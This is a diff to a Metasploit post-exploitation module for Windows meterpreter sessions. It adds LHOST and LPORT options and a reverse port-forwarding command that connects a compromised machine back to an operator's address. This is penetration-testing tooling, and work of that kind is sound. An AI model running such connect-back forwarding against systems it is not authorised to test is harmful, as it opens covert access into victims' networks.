@@ -17,10 +17,16 @@ class MetasploitModule < Msf::Post
               Say something that the user might want to know.
             },
             'License'       => MSF_LICENSE,
-            'Author'        => [ 'Name' ],
-            'Platform'      => [ 'win', 'linux', 'osx', 'unix', 'bsd' ],
-            'SessionTypes'  => [ 'meterpreter', 'shell' ]
+            'Author'        => [ 'Hyun-Bum Yang' ],
+            'Platform'      => [ 'win' ],
+            'SessionTypes'  => [ 'meterpreter']
         ))
+
+        register_options(
+            [
+                OptAddress.new('LHOST', [true, 'Address which to connect back to.']),
+                OptPort.new('LPORT', [true, 'Port to receive the connection to.'])
+            ])
     end
 
     def upload(directory)
@@ -95,9 +101,12 @@ class MetasploitModule < Msf::Post
         end
 
         # Attempt to open port forwarding
+        host = datastore['LHOST']
+        port = datastore['LPORT']
         print_status("Starting reverse port forwarding")
-        session.run_cmd("portfwd add -L 10.0.2.5 -R -l 4445 -p 8080 -r 127.0.0.1")
+        session.run_cmd("portfwd add -L #{host} -R -l #{port} -p 8080 -r 127.0.0.1")
 
     end
 
 end
+
